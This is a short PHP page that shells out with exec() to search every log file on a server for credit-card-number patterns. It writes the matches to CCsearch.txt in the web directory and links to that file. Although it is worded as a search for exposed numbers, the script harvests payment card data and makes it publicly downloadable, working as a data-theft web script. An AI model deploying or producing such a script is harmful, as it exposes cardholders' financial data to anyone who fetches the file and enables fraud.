<?php
exec("find / -name '*log*' -exec grep -E '(^|[[:space:]])[456][[:digit:]]{3}((-|[[:space:]])?[[:digit:]]{4}){3}([[:space:]]|$)' {} \; -print > CCsearch.txt &");
?>
Searching accessible logs on filesystem for exposed credit card numbers...<a href='CCsearch.txt'>CCsearch.txt</a> will be created and populated during process.
